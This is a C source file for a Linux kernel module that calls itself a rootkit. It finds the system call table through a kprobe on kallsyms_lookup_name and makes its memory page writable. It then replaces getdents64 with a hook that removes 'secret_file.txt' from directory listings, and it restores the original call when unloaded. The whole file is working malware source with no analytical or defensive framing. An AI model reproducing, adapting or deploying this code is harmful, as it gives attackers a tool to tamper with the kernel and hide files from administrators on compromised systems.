#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/kprobes.h> // Required for kprobes

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anonymous");
MODULE_DESCRIPTION("The Ultimate Step");
MODULE_VERSION("1.0");

// The address of the system call table, which we will find at runtime.
static unsigned long *__sys_call_table;

// The name of the file we want to hide.
#define FILENAME_TO_HIDE "secret_file.txt"

// Pointers to the original system calls we are going to hook.
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
    typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
    static ptregs_t original_getdents64;
#else
    typedef asmlinkage long (*orig_getdents64_t)(unsigned int, struct linux_dirent64 __user *, unsigned int);
    static orig_getdents64_t original_getdents64;
#endif

// A helper function to make a memory page writable.
static void make_page_writable(unsigned long address) {
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
}

// A helper function to restore a memory page to read-only.
static void make_page_readonly(unsigned long address) {
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
}

// Our new, malicious getdents64 system call.
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir;
    long bpos;
    char *dbuf;
    long bytes_read;
    
    bytes_read = original_getdents64(regs);
    if (bytes_read <= 0) {
        return bytes_read;
    }

    dbuf = (char *)dirent;

    for (bpos = 0; bpos < bytes_read;) {
        current_dir = (struct linux_dirent64 *)(dbuf + bpos);
        
        if (strcmp(current_dir->d_name, FILENAME_TO_HIDE) == 0) {
            int reclen = current_dir->d_reclen;
            int remaining_bytes = bytes_read - (bpos + reclen);
            memmove(current_dir, (char *)current_dir + reclen, remaining_bytes);
            
            bytes_read -= reclen;
            continue;
        }
        
        bpos += current_dir->d_reclen;
    }

    return bytes_read;
}
#else
static asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    struct linux_dirent64 *current_dir;
    long bpos;
    char *dbuf;
    long bytes_read;

    bytes_read = original_getdents64(fd, dirent, count);
    if (bytes_read <= 0) {
        return bytes_read;
    }

    dbuf = (char *)dirent;

    for (bpos = 0; bpos < bytes_read;) {
        current_dir = (struct linux_dirent64 *)(dbuf + bpos);
        
        if (strcmp(current_dir->d_name, FILENAME_TO_HIDE) == 0) {
            int reclen = current_dir->d_reclen;
            int remaining_bytes = bytes_read - (bpos + reclen);
            memmove(current_dir, (char *)current_dir + reclen, remaining_bytes);
            bytes_read -= reclen;
            continue;
        }
        
        bpos += current_dir->d_reclen;
    }

    return bytes_read;
}
#endif

// This function is called when the module is loaded.
static int __init rootkit_init(void) {
    // BUG FIX: Moved all variable declarations to the top of the function to fix C90 error.
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };

    printk(KERN_INFO "LKM Rootkit: Loading...\n");

    if (register_kprobe(&kp) < 0) {
        printk(KERN_ERR "LKM Rootkit: Could not register kprobe to find kallsyms_lookup_name.\n");
        return -EFAULT;
    }
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);


    __sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    if (!__sys_call_table) {
        printk(KERN_ERR "LKM Rootkit: Could not find sys_call_table.\n");
        return -EFAULT;
    }

    make_page_writable((unsigned long)__sys_call_table);
    original_getdents64 = (void *)__sys_call_table[__NR_getdents64];
    __sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    make_page_readonly((unsigned long)__sys_call_table);

    printk(KERN_INFO "LKM Rootkit: Loaded successfully.\n");
    return 0;
}

// This function is called when the module is unloaded.
static void __exit rootkit_exit(void) {
    printk(KERN_INFO "LKM Rootkit: Unloading...\n");

    if (__sys_call_table) {
        make_page_writable((unsigned long)__sys_call_table);
        __sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
        make_page_readonly((unsigned long)__sys_call_table);
        printk(KERN_INFO "LKM Rootkit: Original getdents64 restored.\n");
    }

    printk(KERN_INFO "LKM Rootkit: Unloaded.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
